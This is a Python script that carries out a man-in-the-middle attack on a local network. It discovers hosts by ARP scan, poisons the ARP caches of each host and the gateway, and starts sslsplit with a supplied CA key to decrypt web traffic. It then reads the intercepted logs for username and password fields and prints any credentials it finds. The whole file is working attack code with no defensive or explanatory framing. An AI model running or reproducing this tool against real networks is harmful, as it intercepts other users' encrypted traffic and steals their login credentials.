#!/usr/bin/env python3

import os
import re
from math import log2
from time import sleep
import netifaces as ni
from scapy.all import ARP, Ether, srp, send
from subprocess import Popen, run, DEVNULL
# gateway info(ip, nic)
gw = ni.gateways()['default'][ni.AF_INET]
arp_table = {}

def network_scan():
    ip = ni.ifaddresses(gw[1])[ni.AF_INET][0]['addr']
    cidr = 32 - sum([int(log2(256-int(i))) for i in ni.ifaddresses(gw[1])[ni.AF_INET][0]['netmask'].split('.')])
    ipscan = ip + '/' + str(cidr)
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ipscan), timeout = 2)
    # ans.show()
    # ip -> mac
    for sent, recv in ans:
            arp_table[recv.psrc] = recv.hwsrc

    print('Available devices')
    print(' IP Address     | MAC Address       ')
    print('------------------------------------')
    for key in arp_table:
        if(key != gw[0]):
            print(' %-14s | %17s ' % (key, arp_table[key]))

def arp_spoofing():
    for ip in arp_table:
        if ip != gw[0]:
            pkt = ARP(op = 2, pdst = ip, hwdst = arp_table[ip], psrc = gw[0])
            send(pkt, verbose = 0)
            pkt = ARP(op = 2, pdst = gw[0], hwdst = arp_table[gw[0]], psrc = ip)
            send(pkt, verbose = 0)

def sslsplit():
    # run('sysctl -w net.ipv4.ip_forward=1', shell=True)
    # run('iptables -t nat -F', shell = True)
    # # http
    # run('iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080', shell = True)
    # # https
    # run('iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443', shell=True)

    Popen('sslsplit -D -l connect.log -S ssl_log -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080', shell = True, stdout=DEVNULL, stderr=DEVNULL)

    folder_path = "ssl_log"
    file_dict = {}

    while True:
        for file_name in os.listdir(folder_path):
            if file_name in file_dict.keys():
                continue
            file_path = os.path.join(folder_path, file_name)
            if os.path.isfile(file_path):
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    file_content = f.read()

                    match = re.search('username=([^&]+)&password=([^&]+)', file_content)

                    if match is not None:
                        print("Username: ", match.group(1))
                        print("Password: ", match.group(2))
                        file_dict[file_name] = 1
                        break
        sleep(0.5)
            

def main():
    network_scan()
    arp_spoofing()
    sslsplit()

if __name__ == '__main__':
    main()